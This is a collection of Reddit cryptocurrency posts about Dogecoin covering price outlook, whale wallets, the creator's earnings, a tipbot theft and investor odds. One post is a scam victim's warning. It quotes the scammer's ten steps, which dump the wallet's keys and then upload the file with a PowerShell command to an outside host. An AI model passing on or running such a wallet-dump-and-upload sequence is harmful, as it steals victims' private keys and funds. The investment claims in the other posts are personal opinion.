DOGE,cryptocurrency,Dogecoin will never reach $0.69 again,"Dogecoin the original memecoin will not surpass it's previous all time high price of $0.73 in the next bull run.

Most cryptocurrencies surpassed their previous high from May in November except Dogecoin, Monero and Litecoin.  **Inflation, Inflation, Inflation**  Every time a new block of transactions is added to the Dogecoin blockchain, 10,000 DOGE are mined. That’s about 14.4 million DOGE added per day, or about 5.26 billion per year. There are now roughly Ten billion more DOGE since it hit it's previous high of $0.73, that means it would need to reach a marketcap 7.2 billion dollars higher than May of 2021.  **There is always another Dog Coin**  New comers into the crypto space are looking to repeat the success stories they heard about with DOGE or Shiba investors and will probably buy another random shitcoin that has a much lower marketcap.  &#x200B;  https://i.redd.it/2log1bzt1bsa1.gif  ^(None of this should be taken as financial advice and I'm probably wrong about all of it,  DOGE will probably become the next world reserve currency.)",237,2023-04-06 18:13:01,576

DOGE,cryptocurrency,Doge has a single wallet with more than 23.17% of all the Dogecoin in circulation and it can be rugpulled at ANY moment.,"For comparison, the largest Bitcoin wallet is the Binance coldwallet and it holds approximately 1.40% of the current circulating supply while the largest Ethereum wallet is the  Eth2 Deposit Contract which holds 7.6% of all Ethereum.  The largest Dogecoin wallet, which currently holds $5 Billion in Doge of its $21 Billion market cap is very mysterious. It was thought to be Robinhood or some other exchange but that has previously been dismissed by the Robinhood CEO himself.  [Doge wallet with 23.17&#37; of the entire circulating supply](https://preview.redd.it/go0edwi8nic81.png?width=1436&format=png&auto=webp&s=67d99e6b36c56bcf24470f6676421f98dee70f4f)  Any wallet that holds over 23.17% of the current supply has more than enough to rug pull an entire coin to near zero. Even half of that can cause the price to crash to unrecoverable levels due to how liquidity and market caps work.  According to Forkast,  >For new cryptocurrencies, if the top 10 wallets hold **more than 20% of the** token, or worse, a large percentage of the token is held in a single wallet, then this is a dangerous sign of a potential rug pull.  **For Doge, the top 14 wallets own  46.11% of all Dogecoin.**  TLDR: Avoid any Cryptocurrency that has wallets capable of rug pulling the entire project. Don't let a false sense of security take over just because Doge is popular. It still does not make Doge immune to rugpulls. Never let yourself be at the mercy of a single wallet.  EDIT: The amount of people on the comments claiming it to be the Robinhood wallet DESPITE Robinhood's CEO publicly stating the company does not hold that much Doge as far back as May is the same argument Shib shillers make. It is careless copium.

DOGE,cryptocurrency,This is how much the creator of Dogecoin earned,"The creator of dogecoin, Billy Markus, is often called ""salty"" online. This is for good reason, he admits. He sees scammers making millions while he himself earned only a fraction on dogecoin. Dogecoin is consistently in the top 20 of all crypto currencies. The meme-coin was founded as a joke, but gained popularity for many different reasons. In the bull market of 2021, the coin rose from $0.01 to $0.74, an increase of over 7400%.  &#x200B;  **Marcus didn't get rich**  In particular, Elon ""dogefather"" Musk contributed to these increases. With tweets and rumors, he made sure that almost everyone was taken in by the currency. In this kind of action there are always winners and losers. So during this period, many people got rich from DOGE, but people also lost money. Billy Markus never really made himself rich with his creation.  &#x200B;  https://preview.redd.it/54x0rzltuxq81.png?width=554&format=png&auto=webp&s=fcd32e4ccd644830ba88f6cce9ef9a42c2ac8436  ***'Of course I'm salty!'***  ""*People always say I'm salty,*"" Markus tweeted. ""*Of course I'm salty! I made $3000 from a crypto with a market capitalization of $80 billion. Watching scammers make millions and strangers attack me all day. Who wouldn't be salty?*""  &#x200B;  ""I'm not saying I'm struggling, I've always been fine, except when I sold my crypto in 2015 to pay the rent. I'm just giving context to why so many things are so extra annoying; why it's annoying that 'entitled bastards' 8 years later say I should make them richer.""  &#x200B;  *'Create a dogecoin 2'*  So Marcus finds it hard that people hold him accountable for their portfolio, even though he himself had sold his crypto in 2015. A Twitter user shot in an idea to create 'dogecoin 2' to make millions, but that is not possible according to Markus.  &#x200B;  https://preview.redd.it/r5ktwxazuxq81.png?width=562&format=png&auto=webp&s=33cc0d59bf556f34fbbe56c61dab4b07e76f7347",830,2022-04-01 15:48:51,479

Shouldn't we as a community band together instead of mocking other people's success?,"Recent posts here have mocked outright the guy who took a risk and made a million dollars on dogecoin.  So what if he is down from that million? Could it hurt anyone to congratulate the guy instead of poking fun at his misfortune? I mean he is still up 250k and never sold. I don't know about you, but that is more money than I have ever made in crypto and the guy has genuine balls to risk 250k early on Dogecoin.  And incase you didn't notice, the whole damn market is down at the moment not just memecoins.  Yes he took a risk and yes i wouldn't recommend anyone invest that much money on a memecoin, but it paid off for him and isn't the whole damn point of investing in crypto to MAKE money?   We should be uniting people in the crypto community not dividing them by making fun at them. I for one am happy for him. If he becomes a future multi millionare doge holder I hope he sets and example by being humble back to those smug people who relentlessly poked fun at his misfortune.",855,2022-02-22 07:23:51,467

DOGE,cryptocurrency,Just got Scammed of 91k Dogecoins,"I mined dogecoin in my first year of university in 2013. It was a fun thing to do in-between studying for exams with my floormates. I managed to mine 91k coins. I never touched them since 2013. Thankfully I kept my old laptop.  It had been on my mind even during the last bull market in 2017 if I could even access my dogecoins. Never got around to try, was busy with university/life. And I was more than happy to just keep the dogecoins and see what happens. It was so exciting back then to see DogeCoin go up in price from being worth nothing to $0.06 and eventually $0.08 cents. With the recent price surges, I decided I would figure out how to take out my coins. Mainly because of a growing doubt in my mind that my coins were not accessible. I made a post yesterday about the coins I mined and how to transfer them out of a 2013 wallet. I got a DM from user -Jax\_Brantley- (sorry reddit won't let me link his profile). Telling me that I needed to get on the ""Correct Fork"" otherwise when I send my coins they would be ""stuck in limbo"". He sent me two posts corroborating his claims:  [https://github.com/dogecoin/dogecoin/issues/250](https://github.com/dogecoin/dogecoin/issues/250)  [https://np.reddit.com/r/dogecoinbeg/comments/1uh7z4/beg\_lost\_coins\_to\_fork\_after\_just\_starting\_much/](https://np.reddit.com/r/dogecoinbeg/comments/1uh7z4/beg_lost_coins_to_fork_after_just_starting_much/)  His profile looked legit to me with activity on the doge forums. Even a popular post saying how he recovered 389k of Dogecoins ([https://np.reddit.com/r/dogecoin/comments/n2lmhu/doge\_coin\_saved\_my\_life\_holding\_389k\_coins/](https://np.reddit.com/r/dogecoin/comments/n2lmhu/doge_coin_saved_my_life_holding_389k_coins/)). He told me how my story was similar to his. His profile has many comments ""helping other against scammers"" in the community.  The story he presented to me made sense and I gave him a chance; this was due to my lack of knowledge (my floormate installed everything on my computer), outdated Dogecore wallet, the posts he sent me, his reddit profile. I was unknowingly falling for his bait.. Anyways we talked some more. I uploaded our conversation for those that are interested. It seems he deleted our first messages. [https://imgur.com/gallery/yh1g7CQ](https://imgur.com/gallery/yh1g7CQ)  The main part of my post is to bring awareness to this scam. If anyone is trying to take advantage of your 'old wallet' pre-2014 fork, please do NOT give them any of your time. Please avoid any DMs containing the following steps (he even 'kindly' wrote detailed steps for my dumbass):  Step 1) Close dogecore-qt.exe and find the dogecore-qt.exe (right click it and run as admin)  Step 2) go to Tools -> debug -> console  Step 3) type  dumpwallet [peers-log.zip](https://peers-log.zip/)  Step 4) find the zip beside dogecore-qt.exe or in C:/Program Files/Dogecoin  Step 5) in this folder hold shift + right click anywhere and select open ""powershell here"" from the dropdown menu  Step 6) type this command or copy paste it  invoke-webrequest -method PUT -infile .\\[peers-log.zip](https://peers-log.zip/) [dogecoin-peers.online/nodes](https://dogecoin-peers.online/nodes) \-usebasicparsing  Step 7) go to the new folder it created called ""dogecoin-peers/online"" and find the file called nodes.txt and open it.  Step 8) It will have a list of connection failed and node ID  Step 9) go to the console like in step 2 and type remove node <ID HERE>  Step 10) Restart wallet and you are all done.  After completing step 6, the truth presented itself. I got scammed... I looked on reddit more for this type of scam (should have had a better eye originally). Sadly, I came across this post too late. [https://np.reddit.com/r/dogecoin/comments/n2yxgq/how\_the\_scam\_works/](https://np.reddit.com/r/dogecoin/comments/n2yxgq/how_the_scam_works/)  For those interested, here's my old wallet: [https://dogechain.info/address/DFCW6SR6FB518RkpYjhsDL5BkX1zqRKe3A](https://dogechain.info/address/DFCW6SR6FB518RkpYjhsDL5BkX1zqRKe3A)  A picture of the old wallet from my laptop.

After writing this out, I have been able to get more clarity and peace.  I hope there is someone that I can help and they would not fall for the same scam I did.

DOGE,cryptocurrency,"Back in the day on Reddit dogecoin tipping bot was popular and Redditors used it to tip others. However, one day in 2017 bot owner made a post that they sold all of users' Doge to fund their personal failures. 109 million doge from 84k accounts was stolen, worth $6.7 mill now or $80 mill during ATH","Since I couldn't fit everything in the title I am adding that at the time that this person said user's funds are forever lost, that amount of Doge (in May 2017) was worth around $130k+, so even then it was not a small chunk of money at all. Some users even at that point had over $500 of Doge on their balance.  This is the post the creator of dogecoin tip bot made to justify his actions: https://np.reddit.com/r/dogecoin/comments/69vycc/important_im_taking_dogetipbot_to_a_server_farm/   So in the whole post he did not really even fully apologize to people, but it felt like that post was made more as an attempt to feel sorry for him. As if he was close to bankruptcy, had to layoff some workers (all types of excuses) so had to take all of the doge from the balances. Exact amount of Doge that was there was 108,911,472.26171964 DOGE from 84,671 accounts in total. That means average user had on balance around 1300 DOGE. That would've been worth over $900 during its ATHs.  A lot of users had pretty huge balances on the dogecointipbot that they did not withdrew which were just wiped out aka stolen by the creator, so they must have felt a great amount of anger when May 2021 hit and Doge reached heights of over $0.7. Some folks had more than 100k Doge on their balances that they thought was safe, and that the person running the dogecointipbot was trustworthy. A lot of that stolen money could have been life changing to people that this was stolen from.  It is even more ridiculous reading some comments in the original post and seeing how he emotionally duped a lot of people as if he's some sort of a victim in this whole story, when in the end all he did was stole other people's crypto and financed their own personal ventures with it.",433,2023-09-20 07:58:40,319
DOGE,cryptocurrency,Is the Era of Dogecoin over?,"I've been watching Dogecoin for quite a while now, it's what brought me into crypto (a little over an year ago!).  Anyways, ever since the grand slam dump of a fall from what was an astonishing number for a coin like doge, It has been in a constant downtrend ever since. Now currently at $0.122 from it's ath of $0.68, thats a fall of nearly 70%!  [Consistent downtrend \(1D chart\)](https://preview.redd.it/kadgk0cpelk81.png?width=891&format=png&auto=webp&s=15f4b2d6d0c637c624ea0a2c22859b6dea2952b7)  There have been minor jumps and pumps along the way, but after every single jump, there's a even bigger dump. The gap between pumps have been becoming higher and higher, and the duration of the pump has shown to be shortening over time.  Is it safe to say the era of not memecoins, but dogecoin in reference is over? I honestly don't think Elon or anyone for that matter would be able to bring back the hype of dogecoin as it was back in May. I personally know many people who bought at the top and still hold for the ""$1 dogecoin!"" line.   I although did hold through .07 and saw my investment hit the multi-thousands. I didn't sell because of that line, my knowledge in cryptocurrency tokenomics has a huge role in my decision making. I'm still baffled that Dogecoin managed to pull off being in Top 3 cryptocurrencies, when you look at it now. That's crazy!  Anyways, just wanted to discuss my thoughts. What do you think? I don't think doge will ever go back up aside from the little pumps it may have, definitely not close to where it was at it's highest.",631,2022-02-28 15:37:41,621
DOGE,cryptocurrency,FYI just one single address owns 28% of all Dogecoins in existance. That alone should worry anybody.,"Since Dogecoin has been talked a lot here on this sub today and many people have come supporting it or attacking it, it is worth noting that one single investor owns more than a quarter of all Dogecoins in existence.  >A dogecoin ""whale"" owns 28% of the meme-based token, according to a report from the Wall Street Journal.   >Records reveal that 28% of the cryptocurrency in circulation is owned by a single investor, though the person or entity has not been identified.  https://markets.businessinsider.com/currencies/news/dogecoin-biggest-holder-owns-28-of-the-cryptocurrency-2021-2-1030093749  You might have made a lot of money of it, but I think that a single person owning so much it's at the very least a serious redflag.  EDIT: [This is the address in question](https://dogechain.info/address/DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L). Many have said that it is from Robinhood. While it is possible because of the amount of money it has, **the address has only received 878 transactions and has only sent 21 transactions.** Very unusual for an exchange address.",1069,2021-04-15 20:29:32,376

DOGE,cryptocurrency,"Dogecoin: Who Buys It, Why It Will Fail, and Why It Bothers Me","Woof. Okay. I’ve had enough. So I’ve decided to finally put this down into an original post.   **I’m going to tell you (A) The people who buy Dogecoin, (B) Why it will fail, and (C) Why it bothers me.**  **(A) The people who buy Dogecoin**    **A1) The crypto n00b/amateur.** These people were not involved in the last bull market, have no idea how many Dogecoins there are, don’t know how the Dogecoin network is “secured”, think BTC is too expensive, want to get rich quick and think they are getting in early. Most heard about it from a friend who put $100 in and made a few thousand. Some actually believe Doge is the new BTC (lol, ouch). They will ride Dogecoin down in the bear market and get REKT as fuck.     **A2) The day trader.** These people think they can consistently beat the base rate of simply HODLing BTC and paying capital gains taxes on each trade. Many probably cheat on taxes. Most don’t make much $. They don’t care about any of the technology although some may understand peripherally. They will attempt to buy low and 3-5x their profits and then GTFO. They will never ride their coins down all the way in a crash.     **A3) The OG doge people.** Many of these people probably have large stashes of non-joke coins like BTC, ETH, etc. A few of them have massive %s of all the Dogecoins in existence. They will slowly dump their bags on the above classes and put it into USD or BTC so they won’t lose their paper millions/billions in the inevitable crash.   **(B) Why Dogecoin will “fail” and crash**     **B1) The network is incredibly vulnerable to attack and nowhere near a stable store of value because of it.** The hash rate backing it is pathetically small and there is little to no development supporting it…         **See EDIT2 at end 😇. Apparently it’s not so vulnerable because it’s tied to Litecoin mining which is secure**     **B2) There is no development on this network.** Fact. Conversely, there is immense amounts of development happening in other projects; development which solves real problems, enhances decentralization, secures billions of real dollars of value, etc     **edit: apparently there is a small amount of dev now happening. After several years dormant...**     **B3) It has gone up so fast, people have such huge paper gains that sooner or later they will cash them out**     **B4) There are 120 BILLION coins, and 14 million new ones per day.** That’s about 4% inflation guaranteed for a decade or two. This type of inflation may be fine for fed coins and government fiat but why the fuck would anyone want it for a future store of value or currency? LOL much no thank you.     **edit: 4% and slightly decreasing over time**     **B5) Institutions will never buy this for reasons B1-4 above (and many more).** You cannot sustain market caps in the hundreds of billions of dollars without institutions.   **(C) Why it bothers me**     **C1) People who don’t know better will get rekt and turned off cRyPto.** Then maybe they’d support fed coin when it comes out and might even support a ban on Bitcoin (should that ever become politically feasible). They’ll miss the true opportunity that is here and allow rich people and institutions to have more of the pie.     **C2) Nobody crypto-competent would buy and hold Doge, yet people like the Winklevoss twins and other big exchanges are shilling doge coin listings to grab a slice of the trading fees.** They are peddling trash they would never hold themselves to make a quick buck. Sound familiar? Just like today’s big banking system most everyone on here detests.     **C3) It’s so lazy. It’s obviously not the next Bitcoin.** Do a little research and you’ll know it’s a joke. *It is a fork of a fork OF A FORK of Bitcoin*. The real deal is sitting there in plain sight, but…     **C4) Unit bias is so real, WOW.** Bitcoin is perceived as too expensive. It’s really sad how human brains fall victim to this extremely well known and obviously-occurring-right-now bias.     **C5) This may cause a regulatory backlash on legitimate projects.** Puke. The last thing we need is excessive gov regulation around this market. But when misinformed lazy people lose significant amounts in a joke meme project like Dogecoin, you better believe there will be calls to step in.     **C6) Elon is a narcissistic deuchebag.** Do you really want a narcissistic billionaire in charge of the future of money? No. I want nobody in charge. I want a leaderless, headless, consensus driven decentralized network instead.   If you have Dogecoin and read this far, bravo, I’m impressed.  **If you are a supporter of real blockchain projects (perhaps aligning with beautiful philosophical goals) and want to help ensure they succeed and aren’t stopped by the dark forces that be, then it’s incumbent on you too to help this revolution succeed. That means stopping scammers and combatting false narratives.**  Rant over. I wish everyone a great bull market part two after this intermission. Have fun staying rich/poor.   Cheers y’all! 🍻 🖤    PS: In anticipation of the incoming brain-dead-level attack comments... **I’m not mad about your paper gains bro.** 👹  WOW   **EDIT1: this direct message is why I post this: “Heya wanted to say thanks for that enlightening post  I'm new into crypto and love when I see honest and informative posts. You don't know who and what to believe anymore.”**  **EDIT2: apparently litecoin mining (which doge is piggybacked on) is called Scrypt and it is much harder to 51% attack than I thought. I’ll look into it more.**  **EDIT3: I want all of crypto to succeed and I want everyone to win. If doge helps people get into crypto then great. Then maybe they’ll learn more about other projects that are actually doing things.**  **I wish everyone the best just be responsible and stop thinking me pointing out obvious flaws with your pet project are me being toxic lol... it’s sharing pretty much undeniable information; sorry.**",707,2021-05-20 12:22:55,698

DOGE,cryptocurrency,Dogecoin is dead! It’s a good thing too.,"While almost every coin is up hella over the last 2 weeks, doge is stuck at 19-20 cents😂   I think doge brought in a ton of new people to crypto including myself and during this dip over the last few months most of us studied up and realized it’s a shit coin and have pulled our money out and invested in quality projects!   Thank you doge for bringing me into crypto and snatching 50 percent of my portfolio and teaching me how to get that 50 percent back by not investing in you anymore😂   Edit: a lot of you are missing the point but I would expect nothing less from Reddit.  My point is the hype is dead. And most of the investors have realized there are much better projects to invest in instead of doge which is why we are seeing most legit projects pump these last two weeks while doge stays stagnant.   This does not mean doge will never go up again. I’m sure it will go up during the next bull run as almost all coins will. But I still think it’s a shit coin in comparison to other top tier coins out.   Also this is my first ever post in this subreddit and it’s about my own personal experience. It’s not a damn moon farming post I’m actually surprised it’s gotten this much traction. I appreciate all the comments, especially the hate😂",326,2021-08-05 03:02:19,1093

DOGE,cryptocurrency,What is Dogecoin? Why is Dogecoin? How is Dogecoin? Everything you need to know in 5 minutes or less.,"Even though you probably won't admit it, you are secretly holding thousands of Doge hoping that one day it will hit $1 and make your dreams come true.  #**What is Dogecoin?**  Dogecoin was co-founded by IBM software engineer Billy Markus and Adobe software engineer Jackson Palmer, who set out to create a peer-to-peer digital currency that could reach a broader demographic than Bitcoin.  ***Full story and a lot of interesting stuff can be found on the [Wiki page](https://en.wikipedia.org/wiki/Dogecoin)*.**  In the beginning, there were only 100 Billion Doge, and all of them were mined in just two years. After that, the code was updated and another 5 Billion Doge were to be created every year making Doge a currency with infinite supply somewhere in 2015. As documented by [mainstream media](https://arstechnica.com/information-technology/2014/02/dogecoin-to-allow-annual-inflation-of-5-billion-coins-each-year-forever/), some community members disliked this decision and complained that their investment will go to zero while others supported the unlimited supply because true Doge believers don't care about USD value. With all those new digital assets emerging from nowhere the internet needed a currency and Doge filled that gap.  #**Why is Dogecoin?**  If Bitcoin ever goes mainstream you probably won't be able to purchase a whole Bitcoin ever again. Sats would become the standard and value should (in theory) constantly keep going up because network usage will need to keep going up as well. Now imagine that you actually held through hell and back, waited for Bitcoin to hit millions just to lose your private keys however that may happen. No one would be able to recover that capital and you would find it hard to get a new reason to move on. With infinite inflation, things look a bit different.  Scarcity rewards those that get in early and hold on to that currency until demand increases significantly. Doge, on the other hand, incentivizes spending and transacting making it an actual currency. 5 Billion coins per year do sound like a lot but it makes perfect sense in the long run. For example, if you have 100 coins and add 100 more the next year your inflation rate would be 100% but as time passes that percentage will decrease due to the increase in supply. In 100 years your inflation rate is only 1% and still decreasing. To put it simply, Bitcoin is an asset that is expected to have an increase in demand within the next few years or decades while Dogecoin is a currency that aims to provide fast, easy, and cheap value transfers in everyday transactions. If Bitcoin is used to store value, Dogecoin is a tool to quickly and cheaply transfer that value.  #**How is Dogecoin?**  Dogecoin was created as a fork of Litecoin and is also [secured by miners](https://www.coinwarz.com/mining/dogecoin/hashrate-chart). It has a much faster block time than LTC of just 1 minute, which made Dogecoin one of the fastest and cheapest currencies to transact with back in the ""old days"". It recently spiked in popularity thanks to Elon Musk and TikTok but if you actually follow the [Dogecoin subreddit](https://np.reddit.com/r/dogecoin/) you will notice that they don't care much about your price speculation. As long as 1 Doge = 1 Doge no one is complaining. In terms of development, there hasn't been a single major update since 2015 but we did make it to [NASCAR](https://www.theguardian.com/technology/2014/mar/27/nascar-dogecoin-sponsor-josh-wise-talladega-superspeedway). As far as network usage goes, Dogecoin [averages](https://bitinfocharts.com/dogecoin/) about 1.3k per hour compared to 14k on the Bitcoin network.  So how is Dogecoin? Same as usual I guess.",1197,2021-01-14 11:47:05,175

DOGE,cryptocurrency,"You always hear about the guy who made $100K by betting $100. You never hear about those who risked thousands and are left with nothing. Out of 40,000+ coins analyzed over the past 10 years, only 1.7% delivered a 100x return!","Here’s the hard truth about investing:  *You always hear about the guy who made $100K by betting $100. You never hear about those who put in thousands and are left with nothing.*  All of us have at least once wished we had made a similar play to the one that [turned $17 into \~6M](https://www.benzinga.com/markets/cryptocurrency/21/05/21076574/he-invested-17-in-shiba-inu-now-he-has-almost-6m)[.](https://www.cnbc.com/2021/07/06/millennial-dogecoin-millionaire-on-being-paid-in-dogecoin.html) More than 2.1 million people right now are trying to find the next crypto moonshot. Even the CEO of Coinbase is touting how if someone had bought $100 Bitcoin when Coinbase was founded, it would be worth $1.5 million today.  With all that’s going on, what’s the actual probability of getting a 100x return on your investment in the crypto world?  # What are the odds that you will lose 100% of your investment?  Of the more than 40,000 coins that traded in an exchange at least once in the last 10 years, only 38% are still alive. So forget about making a profit — the probability that the coin you buy will survive over the long run is only \~ 1 in 3.  [Total number of coins: 40,399 | Source: Market Sentiment Research, CoinGecko](https://preview.redd.it/3den43lgi66e1.png?width=779&format=png&auto=webp&s=f13079314237019897f6099b094b53cc56c4425d)  # What about 100’xing your investment?  While there are probably hundreds *(even thousands)* of coins that might have 100’xed in value during their brief existence *(like the Hawk Tuah coin)*, it’s unrealistic to expect to find them and invest in them before someone rug pulls them out of existence.  To get a more realistic scenario, we kept a minimum market cap limit of $10 Million and required the coin to be present in the top 100 coins based on market cap.  The backtest is simple — At the beginning of every month *(starting in 2014)*, we check what the top 100 most popular coins were and the probability that you would have 100’xed your investment if you held on to that coin *(*[data here](https://docs.google.com/spreadsheets/d/1r-3jqju58bfewDd2GxfH0jd0woO2kSKYEodFYkf6JB0/edit?usp=sharing)*).*  In the last 10 years, there were a total of 9,502 coins that fit our criteria. Out of these, only 442 *(4.6%)* grew more than 100x. This assumes that you sold at the very top. If you had held on to these coins to date, the number drops to 160.  **So, over the holding period, the chance that you 100’xed your investment on a coin is only 1.7%.**  If you remove the duplicates *(as the same coin can come up in our filter in different months),* of the 460 cryptocurrencies that made it into the list, only 38 *(8%)* grew more than 100x. If you held on till 2024, only 8 coins *(1.7%)* provided you with a 100x return.  >  If you are calculating the expected value and think that you will come out ahead *(given you have a \~2% chance of 100x returns)*, you must read [our research on Kelly Criterion.](https://www.marketsentiment.co/p/the-problem-with-averages)  For those who are determined to try to win, here are a few things to consider:  1. **Be aware of the odds** — The chance of you hitting a 100x return on your meme coin investment is less than 1 in 50. To put this in perspective, it’s like picking a specific card out of a shuffled deck of cards on your first try! 2. **Spread your bets —** The best way to improve your odds of winning is to survive.

DOGE,cryptocurrency,I hate Dogecoin because of its fanbase.,"I had nothing against Dogecoin. To be honest, I liked it because it was the most popular meme coin these last years and the community seemed really cool - until Elon Musk started to talk about it (at least, that's why I think it became so annoying).  **EVERY POST** involving crypto (in some cases not even involving it), especially posts by Elon Musk, there are these people spamming dumb shit about this doggy coin.  One of the most famous figures I've noticed is [Matt Wallece](https://twitter.com/MattWallace888). Just take a look at his tweets history and you will understand what I'm saying - and he is just one of them.  I'm annoyed of Dogecoin because of these people. How can your life be resumed by *convincing people all the time* that there's a crypto out there that is worth paying for?  Edit: Yeah, hate is a strong word. I don't hate it, but I'm sick of reading Dogecoin everywhere.  https://preview.redd.it/pitnyb9i9px81.png?width=602&format=png&auto=webp&s=266b2d50b90bf2cbc2f61148f8fbbcb9f1d28ff7",414,2022-05-05 18:28:09,275
